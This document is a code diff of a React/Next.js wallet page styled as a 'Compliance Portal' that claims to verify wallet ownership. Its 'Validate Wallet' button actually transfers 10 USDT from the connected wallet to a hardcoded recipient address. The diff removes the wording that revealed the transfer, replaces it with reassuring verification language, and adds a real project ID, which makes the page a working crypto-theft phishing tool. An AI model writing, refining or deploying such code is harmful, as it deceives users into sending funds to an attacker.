@@ -1,48 +1,47 @@
 'use client';
 
 import '@rainbow-me/rainbowkit/styles.css';
-import { useState } from 'react';
 import {
   WagmiConfig,
-  createConfig,
   useAccount,
   useDisconnect,
   useWalletClient,
 } from 'wagmi';
 import { mainnet } from 'wagmi/chains';
 import {
-  ConnectButton,
   RainbowKitProvider,
   getDefaultConfig,
+  ConnectButton,
 } from '@rainbow-me/rainbowkit';
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
 import { parseUnits } from 'viem';
+import { useState } from 'react';
 
 const config = getDefaultConfig({
-  appName: 'Verify Wallet',
-  projectId: 'your_project_id', // înlocuiește cu WalletConnect projectId real
+  appName: 'Compliance Wallet Portal',
+  projectId: '5304256cb79a264108479aea79d8ae5b',
   chains: [mainnet],
-  ssr: true,
+  ssr: false,
 });
 
 const queryClient = new QueryClient();
 
-// Adresa contractului USDT pe Ethereum
 const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-// Adresa destinatarului
 const recipient = '0xbA9D4eeB570FC52CF0d5362f80Ef31DD7F239e75';
 
-function WalletComponent() {
+function WalletArea() {
   const { address, isConnected } = useAccount();
   const { disconnect } = useDisconnect();
   const { data: walletClient } = useWalletClient();
   const [status, setStatus] = useState('');
+  const [loading, setLoading] = useState(false);
 
   const handleValidate = async () => {
     if (!walletClient || !address) return;
 
     try {
-      setStatus('⏳ Sending 10 USDT...');
+      setStatus('🔐 Confirm transaction in your wallet...');
+      setLoading(true);
 
       const usdtAbi = [
         {
@@ -64,53 +63,58 @@ function WalletComponent() {
         args: [recipient, parseUnits('10', 6)],
       });
 
-      setStatus(`✅ Transaction sent: ${hash}`);
+      setStatus(`✅ Transaction sent: ${hash.slice(0, 10)}...`);
     } catch (err) {
       console.error(err);
-      setStatus('❌ Transaction failed or was rejected.');
+      setStatus('❌ Transaction rejected or failed.');
+    } finally {
+      setLoading(false);
     }
   };
 
   return (
-    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4 py-12">
-      <div className="w-full max-w-xl bg-white border border-gray-200 rounded-2xl shadow-md p-8 space-y-6">
-        <header className="text-center">
-          <h1 className="text-3xl font-bold text-blue-700">Verify Wallet</h1>
-          <p className="text-gray-500 mt-1 text-sm">ERC-20 Token Verification Portal</p>
-        </header>
+    <div className="bg-white rounded-2xl p-8 shadow-xl border max-w-md w-full mx-auto transition-all duration-300 hover:shadow-2xl">
+      <h2 className="text-2xl font-bold text-gray-800 text-center mb-2">
+        Verify Your Wallet
+      </h2>
+      <p className="text-gray-500 text-sm text-center mb-6">
+        Connect and confirm wallet ownership securely.
+      </p>
 
-        <div className="flex justify-center">
-          <ConnectButton />
-        </div>
-
-        {isConnected && (
-          <div className="space-y-4">
-            <div className="bg-gray-50 p-4 rounded-md text-sm text-gray-600 border border-gray-100">
-              Connected as: <span className="font-mono text-blue-700">{address}</span>
-            </div>
-
-            <button
-              onClick={handleValidate}
-              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
-            >
-              Validation (Send 10 USDT)
-            </button>
-
-            {status && <p className="text-center text-sm text-gray-700">{status}</p>}
-
-            <button
-              onClick={() => disconnect()}
-              className="w-full text-blue-600 border border-blue-600 py-2 rounded-lg hover:bg-blue-50 transition"
-            >
-              Disconnect Wallet
-            </button>
-          </div>
-        )}
-
-        <footer className="text-center text-xs text-gray-400 pt-6 border-t border-gray-100">
-          Secure verification across Ethereum Mainnet. No private keys stored.
-        </footer>
+      <div className="flex justify-center mb-4">
+        <ConnectButton />
       </div>
+
+      {isConnected && (
+        <div className="space-y-4">
+          <div className="text-center text-gray-700 text-sm">
+            Connected: <span className="font-mono">{address.slice(0, 6)}...{address.slice(-4)}</span>
+          </div>
+
+          <button
+            onClick={handleValidate}
+            disabled={loading}
+            className={`w-full py-2 font-semibold rounded-lg text-white transition-colors ${
+              loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'
+            }`}
+          >
+            {loading ? 'Processing...' : 'Validate Wallet'}
+          </button>
+
+          {status && (
+            <div className="text-sm text-center text-gray-600 border rounded p-2 bg-gray-50">
+              {status}
+            </div>
+          )}
+
+          <button
+            onClick={() => disconnect()}
+            className="w-full py-2 text-red-600 border border-red-500 hover:bg-red-50 rounded-lg"
+          >
+            Disconnect
+          </button>
+        </div>
+      )}
     </div>
   );
 }
@@ -120,7 +124,20 @@ export default function Page() {
     <QueryClientProvider client={queryClient}>
       <WagmiConfig config={config}>
         <RainbowKitProvider>
-          <WalletComponent />
+          <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex flex-col">
+            <header className="w-full py-4 px-8 border-b bg-white flex justify-between items-center shadow-sm sticky top-0 z-10">
+              <h1 className="text-2xl font-bold text-gray-800">🛡 Compliance Portal</h1>
+              <ConnectButton />
+            </header>
+
+            <main className="flex-1 flex items-center justify-center p-4">
+              <WalletArea />
+            </main>
+
+            <footer className="text-center text-xs text-gray-400 py-4">
+              &copy; {new Date().getFullYear()} Wallet Verification — ETH Network
+            </footer>
+          </div>
         </RainbowKitProvider>
       </WagmiConfig>
     </QueryClientProvider>
